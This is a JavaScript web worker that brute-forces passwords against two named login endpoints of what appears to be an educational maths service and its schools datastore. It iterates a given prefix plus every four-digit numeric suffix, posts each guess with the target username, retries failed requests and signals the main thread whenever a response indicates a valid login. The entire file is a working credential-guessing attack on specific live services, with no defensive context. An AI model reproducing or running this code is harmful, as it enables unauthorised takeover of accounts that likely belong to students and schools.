self.onmessage = function(e) {
    threadTestPassword(e.data[0], e.data[1], e.data[2], e.data[3], e.data[4], e.data[5]);
}

async function threadTestPassword(username, starting, min, max, isSchools, reverse) {
    const url = !isSchools ? "https://m.afficienta.cn/mathjoy/api/v1.0/authSupervisedSession" : "https://api3.afficienta.cn/datastore/login";
    var i = reverse ? max : min;
    while (reverse ? i >= min : i <= max) {
        var current = starting + i.toString().padStart(4, "0");
        try {
            var res = await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
                body: JSON.stringify({password: current, username: username})
            })

            var body = await res.text()
            self.postMessage(["tested", current])
            if (res.status == 200)
                i += reverse ? -1 : 1;
            else
                continue;

            if (isSchools) {
                if (JSON.parse(body).status != "fail") {
                    self.postMessage(["success", current]);
                }
            }
            else {
                if (body != "\"\"" && body != "") {
                    self.postMessage(["success", current]);
                };
            }

        }
        catch (ex) {
            continue;
        }
        
        
    }
}
